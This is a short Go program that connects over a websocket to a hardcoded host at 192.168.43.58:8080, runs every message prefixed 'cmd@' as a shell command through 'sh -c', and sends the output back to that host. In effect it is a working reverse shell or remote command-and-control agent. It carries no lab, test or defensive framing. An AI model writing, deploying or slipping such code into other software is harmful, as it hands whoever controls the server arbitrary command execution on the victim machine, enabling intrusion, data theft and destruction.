package main

import (
	"fmt"
	"log"
	"net/url"
	"os/exec"
	"strings"

	"github.com/gorilla/websocket"
)

func main() {
	u := url.URL{Scheme: "ws", Host: "192.168.43.58:8080", Path: "/ws"}
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		fmt.Println("Error:", err)
	}
	defer c.Close()
	for {
		_, message, err := c.ReadMessage()
		if err != nil {
			log.Println("read:", err)
		} else {
			log.Printf("recv: %s", message)
			if strings.HasPrefix(string(message), "cmd@") {
				cmd := strings.TrimPrefix(string(message), "cmd@")
				out, err := exec.Command("sh", "-c", cmd).Output()
				if err != nil {
					fmt.Println("Error:", err)
				}
				c.WriteMessage(websocket.TextMessage, []byte(out))
			}
		}
	}
}
